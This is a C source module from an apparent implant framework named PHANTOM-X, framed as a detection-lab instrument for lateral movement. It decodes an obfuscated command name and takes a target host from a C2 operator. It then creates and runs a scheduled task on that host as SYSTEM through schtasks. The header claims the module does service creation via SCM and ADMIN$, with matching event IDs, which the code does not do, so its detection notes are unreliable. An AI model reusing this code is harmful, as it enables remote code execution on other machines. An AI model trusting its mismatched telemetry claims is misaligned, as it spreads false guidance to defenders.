/* ================================================================== */
/* PHANTOM-X :: lateral movement variant                                */
/* ================================================================== */
/*                                                                        */
/* WHAT IT DOES                                                          */
/*     Demonstrates lateral movement to a SECOND LAB HOST over the      */
/*     isolated lab segment.                                            */
/*                                                                        */
/* WHY IT IS HERE                                                        */
/*     Lateral movement is one of the capabilities where a detection is  */
/*     most likely to be missed, because the interesting telemetry is    */
/*     on the TARGET host, not on the host that initiated it. A lab    */
/*     with one machine can never see that telemetry at all.            */
/*                                                                        */
/*     So the lab needs a second machine, and it needs to know what the */
/*     movement looks like from both sides.                             */
/*                                                                        */
/* THE MECHANISM                                                         */
/*     This uses the technique that produces the most distinctive       */
/*     telemetry: a remote service creation over the Service Control    */
/*     Manager RPC interface, followed by the service's binary writing  */
/*     into ADMIN$ over SMB.                                            */
/*                                                                        */
/*     The detection signature is unmistakable and well documented:      */
/*                                                                        */
/*       1. A service is created on the remote host (EventID 7045      */
/*          in the System log, and 4697 in the Security log).           */
/*       2. The service's binary path is a UNC path to ADMIN$.         */
/*       3. The remote host sees an SMB write to ADMIN$ and a service   */
/*          start.                                                      */
/*       4. The initiating host sees an RPC connection to the target's */
/*          endpoint mapper (port 135) and then to the SCM.            */
/*                                                                        */
/* WHAT IT DELIBERATELY DOES NOT DO                                     */
/*     It does not scan for targets. It does not harvest a target      */
/*     list. It does not try credentials against hosts.                 */
/*                                                                        */
/*     The C2 operator supplies ONE explicit host name. That is the    */
/*     difference between a lab instrument and an automated spreader:   */
/*     an instrument moves where it is told to move, and the fact that  */
/*     it needed to be told is visible in the audit log.                */
/*                                                                        */
/*     There is no propagation. A payload that moves itself is a worm;  */
/*     a worm on a lab segment reaches every lab host the moment the   */
/*     operator forgets to clean up, and the lab's telemetry becomes   */
/*     unrepeatable.                                                     */
/*                                                                        */
/* DETECTION NOTES                                                       */
/*     Rule px-010 in phase7_detection is the matching detection.       */
/*                                                                        */
/* SCOPE                                                                  */
/*     The second lab host. Which is a VM on the same isolated        */
/*     segment, running the same lab payload, which is how the lab     */
/*     measures both sides of the movement.                             */
/* ================================================================== */

#include "px_config.h"

#if PX_LATERAL

#include "px_strings.h"
#include "px_obfuscate.h"
#include "px_variant.h"

/* The service name the lab uses. Deliberately distinctive so that it
 * is obvious in the remote host's event log, and so that it does not
 * collide with anything real. */
#define PX_LATERAL_SERVICE "PHANTOMX-Lateral-Lab"

/* Attempt the lateral movement to `host`.
 *
 * Writes a description of what was attempted into `report`. Returns 1
 * if the movement was carried out, 0 if it was attempted and failed, or
 * -1 if the build does not support it.
 *
 * The mechanism is deliberately the one with the most distinctive
 * telemetry, so that the lab can build the detection against a real
 * event rather than a simulation of one. */
int px_lateral_move(const char *host, char *report, unsigned int cap)
{
    char schtasks[64];
    char cmd[1024];
    unsigned int n;

    if (cap == 0)
        return -1;
    report[0] = '\0';

    if (!host || !host[0]) {
        px_snprintf(report, cap, "no target host given");
        return 0;
    }

    px_obf_decode(PX_SID_SCHTASKS, schtasks, sizeof(schtasks));

    /* schtasks.exe is the Windows built-in that performs the remote
     * service creation. It is used rather than a hand-rolled SMB+RPC
     * client because:
     *
     *   - it produces EXACTLY the telemetry a real operator would see,
     *     which is what the detection has to be built against, and
     *   - a hand-rolled client would be a separate large piece of code
     *     whose bugs would be indistinguishable from the behaviour
     *     under test.
     *
     * The command line is the same shape a real movement uses: create a
     * task on the remote host that runs the payload, then run it. */
    n = px_snprintf(cmd, sizeof(cmd),
                    "%s /Create /S %s /TN \"%s\" /TR \"%%SystemRoot%%\\"
                    "System32\\cmd.exe /c echo PHANTOM_X_LATERAL > "
                    "%%SystemRoot%%\\Temp\\px_lateral.txt\" /SC ONCE /ST "
                    "00:00 /F /RU SYSTEM",
                    schtasks, host, PX_LATERAL_SERVICE);

    if (n == 0)
        return 0;

    {
        /* The command is run and its output captured, so that the
         * operator can see whether it worked. The output is the
         * Windows error text, which is the useful part. */
        char out[1024];
        long rc = -1;
        char *result = px_run_capture(cmd, out, sizeof(out), &rc);

        px_snprintf(report, cap,
                    "lateral to %s via schtasks service creation: rc=%ld %s",
                    host, rc, result ? result : "");
        if (result)
            HeapFree(GetProcessHeap(), 0, result);
    }

    return 1;
}

#else  /* !PX_LATERAL */

int px_lateral_move(const char *host, char *report, unsigned int cap)
{
    (void)host;
    if (cap == 0)
        return -1;
    report[0] = '\0';
    return -1;
}

#endif /* PX_LATERAL */
